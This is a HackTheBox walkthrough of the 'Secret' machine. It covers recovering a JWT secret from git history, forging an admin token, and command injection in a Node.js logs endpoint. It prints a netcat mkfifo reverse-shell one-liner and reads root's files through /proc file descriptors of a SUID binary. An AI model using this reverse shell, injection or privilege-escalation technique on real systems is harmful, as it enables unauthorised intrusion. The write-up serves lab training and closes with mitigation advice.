---
title: "HackTheBox - Secret"
author: Nasrallah
description: ""
date: 2023-06-21 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, injection, web, burpsuite, nodejs, api, git, proc]
img_path: /assets/img/hackthebox/machines/secret
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Secret](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.120                                                                                                                             
Host is up (0.17s latency).                                                                                                                                   
Not shown: 997 closed tcp ports (reset)                                                                                                                       
PORT     STATE SERVICE VERSION                                                                                                                                
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                           
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
```

We found three open ports, ssh on port 22, nginx on port 80 and node.js on port 3000.

## Web

Let's navigate to the web page on port 80.

![](1.png)

We find a website called `DumpDocs`, and on the bottom we see a download button for the source code.

The website on port 3000 is exactly the same, this means that nginx is acting as a proxy for the node.js application.

Clicking on `Register user` we go to this page.

![](2.png)

Here it shows us how to interact with the api to register a user.

### Burp Suite

Let's start burp suite and register a user.

![](3.png)

We've successfully registered a user, now let's login following the steps mentioned in the website guide.

![](4.png)

We've successfully logged in and received a JWT Token.

![](6.png)

We can use that token to request the `/api/priv` page.

![](5.png)

I tried to manipulate the JWT Token to login as admin but it's not vulnerable.

Let's download the source code

### Source Code

After extracting the source code we find a `.git` directory, let's check the commit history.

```shell
$ git log --oneline                                                                                                                                      
e297a27 (HEAD -> master) now we can view logs from server 😃                                                                                                  
67d8da7 removed .env for security reasons                                                                                                                     
de0a46b added /downloads                                                                                                                                      
4e55472 removed swap                                                                                                                                          
3a367e7 added downloads                                                                                                                                       
55fe756 first commit  
```

On one commit we find the comment `removed .env for security reasons`.

If we check the `.env` file we find that the Token is not there.

```shell
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

Let's check the difference between the two commits `67d8da7` and `de0a46b`

```shell
$ git diff de0a46b 67d8da7                                                                                                                               
diff --git a/.env b/.env                                                                                                                                      
index fb6f587..31db370 100644                                                                                                                                 
--- a/.env                                                                                                                                                    
+++ b/.env                                                                                                                                                    
@@ -1,2 +1,2 @@                                                                                                                                               
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'                                                                                                            
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE                                  
+TOKEN_SECRET = secret                    
```

We got the token.

Using `CyberChef`, let's sign a new JWT Token.

![](7.png)

The reason we used the username `theadmin` is because it's the name we find in `/routes/private.js` that the application uses to check whether the request is coming from an admin or not.

Now back to burp, let's make a request to `/api/priv` using the new token.

![](8.png)

It's tells us that we are admin.

# **Foothold**

## Command injection

When we checked the git logs we see another commit with an interesting comment `now we can view logs from server`

When we check the commit we find the following code got added:

```js
router.get('/logs', verifytoken, (req, res) => {                                                                                                              
    const file = req.query.file;                                                                                                                              
    const userinfo = { name: req.user }                                                                                                                       
    const name = userinfo.name.name;                                                                                                                          
                                                                                                                                                              
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

We can make a request to `/api/logs` with the parameter `file` and it will run the command `git log --oneline $(file)`.

That a command injection right there.

Let's make the request using burp.

![](9.png)

Now let's add the `file` parameter to the url with the value `;id;`

![](10.png)

We successfully run the command `id`.

## Reverse shell

To get a shell we can use `nc mkfifo`:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

![](11.png)

>Don't forget to url encode the payload

![](12.png)

We got the shell!

# **Privilege Escalation**

Running `linpeas` we find a unknown binary with SUID permission.

![](13.png)

The file can give us stats about files and directories.

When we check the source code at `/opt/code.c` we see that it doesn't closes the file after opening it. If we background the script after specifying a file, we can access the file handle at `/proc/[pid]/fd`.

Let's run the script.

![](14.png)

We can see the `3` is pointing to the file we opened, unfortunately we can't read that file.

The `count` script also list the content of directories:

```shell
dasith@secret:/proc/32331/fd$ /opt/count 
Enter source file/directory name: /root
-rw-r--r--      .viminfo
drwxr-xr-x      ..
-rw-r--r--      .bashrc
drwxr-xr-x      .local
drwxr-xr-x      snap
lrwxrwxrwx      .bash_history
drwx------      .config
drwxr-xr-x      .pm2
-rw-r--r--      .profile
drwxr-xr-x      .vim
drwx------      .
drwx------      .cache
-r--------      root.txt
drwxr-xr-x      .npm
drwx------      .ssh
```

We've listed the root's directory and we can see there is a `.viminfo` file which is readable, let's read it using the same technique as before.

![](15.png)

We managed to read the viminfo file, and if we scroll a bit we can find a private ssh key.

Using the key let's ssh as root.

![](16.png)

# **Mitigation**

## Information Disclosure - Git

After downloading the source code we find it's a `git` repository which allowed us to view an old commit that contained the secret token.

Examine the entire version history to ensure that sensitive information is not committed in the past. If sensitive data has been found make sure to delete it completely because even deleted commits can be viewed.

## Command Injection

Proper input validation should be in place by using whitelists and stripping non-alphanumeric characters

Use secure APIs or internal language features instead of running OS commands.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).